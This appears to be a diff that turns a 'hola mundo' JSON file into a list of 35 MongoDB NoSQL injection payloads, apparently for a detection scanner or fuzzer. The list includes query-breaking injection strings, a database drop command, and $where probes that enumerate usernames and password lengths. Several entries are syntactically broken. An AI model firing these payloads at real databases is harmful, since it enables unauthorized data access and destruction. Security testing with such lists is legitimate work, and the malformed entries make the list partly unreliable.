@@ -1,3 +1,212 @@
-{
-    "mensaje": "hola mundo"
-}
+[
+  {
+    "id": "mongo-detect-001",
+    "description": "auto",
+    "severity": "low",
+    "payload": "true, $where: '1 == 1'"
+  },
+  {
+    "id": "mongo-detect-002",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"$where\": \"this.username === '{}'\"}"
+  },
+  {
+    "id": "mongo-detect-003",
+    "description": "auto",
+    "severity": "low",
+    "payload": "' } ], $comment:'successful MongoDB injection'"
+  },
+  {
+    "id": "mongo-detect-004",
+    "description": "auto",
+    "severity": "low",
+    "payload": "db.database.drop({$where: \"1 === 1\"})"
+  },
+  {
+    "id": "mongo-detect-005",
+    "description": "auto",
+    "severity": "low",
+    "payload": "db.database.stats({$where: \"1 === 1\"})"
+  },
+  {
+    "id": "mongo-detect-006",
+    "description": "auto",
+    "severity": "low",
+    "payload": "db.database.getIndexes({$where: \"1 === 1\"})"
+  },
+  {
+    "id": "mongo-detect-007",
+    "description": "auto",
+    "severity": "low",
+    "payload": "db.database.createIndex({$where: \"this.user === \"user123\"})"
+  },
+  {
+    "id": "mongo-detect-008",
+    "description": "auto",
+    "severity": "low",
+    "payload": "db.collection.find({$where: \"function() {return this.username.indexOf(\"admin\") !== -1}\"})"
+  },
+  {
+    "id": "mongo-detect-009",
+    "description": "auto",
+    "severity": "low",
+    "payload": "db.collection.find({$where: \"this.password.length >= 12\"})"
+  },
+  {
+    "id": "mongo-detect-010",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"$where\": \"this.age >= {}\"}"
+  },
+  {
+    "id": "mongo-detect-011",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"$where\": \"this.username == '{}'\"}"
+  },
+  {
+    "id": "mongo-detect-012",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"user\": {\"$exists\": true}, \"password\": {\"$exists\": true}}"
+  },
+  {
+    "id": "mongo-detect-013",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"user\": {\"$exists\": false}, \"password\": {\"$exists\": false}}"
+  },
+  {
+    "id": "mongo-detect-014",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$not\": { \"$type\": \"string\" }}}"
+  },
+  {
+    "id": "mongo-detect-015",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$mod\": [5, 0]}}"
+  },
+  {
+    "id": "mongo-detect-016",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"$where\": \"this.password.length > 10\"}"
+  },
+  {
+    "id": "mongo-detect-017",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"$where\": \"this.age <= {}\"}"
+  },
+  {
+    "id": "mongo-detect-018",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$type\": 2}}"
+  },
+  {
+    "id": "mongo-detect-019",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$type\": 16}}"
+  },
+  {
+    "id": "mongo-detect-020",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"username\": {\"$exists\": false}, \"password\": {\"$exists\": true}}"
+  },
+  {
+    "id": "mongo-detect-021",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$not\": { \"$type\": 3 }}}"
+  },
+  {
+    "id": "mongo-detect-022",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$not\": { \"$type\": 18 }}}"
+  },
+  {
+    "id": "mongo-detect-023",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"$where\": \"this.password.length <= 5\"}"
+  },
+  {
+    "id": "mongo-detect-024",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"$where\": \"this.age > 20 && this.gender === 'male'\"}"
+  },
+  {
+    "id": "mongo-detect-025",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$type\": 4}}"
+  },
+  {
+    "id": "mongo-detect-026",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$type\": 17}}"
+  },
+  {
+    "id": "mongo-detect-027",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$exists\": true}, \"password\": {\"$exists\": false}}"
+  },
+  {
+    "id": "mongo-detect-028",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$not\": { \"$type\": 1 }}}"
+  },
+  {
+    "id": "mongo-detect-029",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$not\": { \"$type\": 19 }}}"
+  },
+  {
+    "id": "mongo-detect-030",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"$where\": \"this.password.length > 8 && this.name === 'admin'\"}"
+  },
+  {
+    "id": "mongo-detect-031",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"$where\": \"this.age > 30 && this.gender === 'female'\"}"
+  },
+  {
+    "id": "mongo-detect-032",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$type\": 5}}"
+  },
+  {
+    "id": "mongo-detect-033",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$type\": 20}}"
+  },
+  {
+    "id": "mongo-detect-034",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$exists\": false}, \"password\": {\"$exists\": true}}"
+  },
+  {
+    "id": "mongo-detect-035",
+    "description": "auto",
+    "severity": "low",
+    "payload": "{\"name\": {\"$not\": { \"$type\": 6 }}}"
+  }
+]
